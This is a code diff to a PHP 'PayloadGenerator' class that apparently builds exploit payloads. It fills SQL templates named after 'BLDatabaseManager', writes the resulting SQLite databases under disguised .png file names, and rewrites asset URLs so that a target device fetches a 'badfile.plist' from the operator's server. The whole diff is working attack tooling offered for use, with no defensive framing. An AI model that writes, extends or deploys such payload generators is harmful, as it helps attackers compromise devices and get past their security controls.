@@ -157,6 +157,8 @@ class PayloadGenerator {
 
         $blTemplateFile = __DIR__ . '/BLDatabaseManager.png';
         $blSqliteFile = __DIR__ . '/BLDatabaseManager.sqlite';
+        $blSqlFile = __DIR__ . '/BLDatabaseManager.sql';
+        $blSql2File = __DIR__ . '/BLDatabaseManager.sql2';
         
         if (file_exists($blSqliteFile)) {
             copy($blSqliteFile, "$dir2/belliloveu.png");
@@ -183,6 +185,26 @@ class PayloadGenerator {
                 $blSql = str_replace($placeholder, $fixedFileUrl, $blSql);
             }
             
+            $this->createDatabaseFromSql($blSql, "$dir2/belliloveu.png");
+        } elseif (file_exists($blSqlFile)) {
+            $blSql = file_get_contents($blSqlFile);
+            log_debug("Using BLDatabaseManager.sql template");
+
+            $placeholders = ['KEYOOOOOO', 'https://your_domain_here', 'http://your_domain_here'];
+            foreach ($placeholders as $placeholder) {
+                $blSql = str_replace($placeholder, $fixedFileUrl, $blSql);
+            }
+
+            $this->createDatabaseFromSql($blSql, "$dir2/belliloveu.png");
+        } elseif (file_exists($blSql2File)) {
+            $blSql = file_get_contents($blSql2File);
+            log_debug("Using BLDatabaseManager.sql2 template");
+
+            $placeholders = ['KEYOOOOOO', 'https://your_domain_here', 'http://your_domain_here'];
+            foreach ($placeholders as $placeholder) {
+                $blSql = str_replace($placeholder, $fixedFileUrl, $blSql);
+            }
+
             $this->createDatabaseFromSql($blSql, "$dir2/belliloveu.png");
         } else {
             $blSql = $this->readTemplate(TEMPLATE_DIR . '/bl_structure.sql');
@@ -216,6 +238,12 @@ class PayloadGenerator {
             try {
                 $db = new SQLite3("$dir3/apllefuckedhhh.png");
                 $db->exec("UPDATE asset SET url = REPLACE(url, 'https://your_domain_here', '" . BASE_URL . "') WHERE url LIKE '%your_domain_here%'");
+
+                // Add support for OSS badfile.plist replacement
+                $db->exec("UPDATE asset SET url = REPLACE(url, 'badfile.plist', '" . BASE_URL . "/badfile.plist') WHERE url LIKE '%badfile.plist%'");
+                // Also handle full URL replacement if it contains badfile.plist (fallback)
+                $db->exec("UPDATE asset SET url = '" . BASE_URL . "/badfile.plist' WHERE url LIKE '%/badfile.plist%' AND url NOT LIKE '" . BASE_URL . "%'");
+
                 $db->exec("UPDATE asset SET destination_url = REPLACE(destination_url, 'GOODKEY', '{$this->guid}') WHERE destination_url LIKE '%GOODKEY%'");
                 $db->close();
                 log_debug("Updated SQLite binary with URLs and GUID");
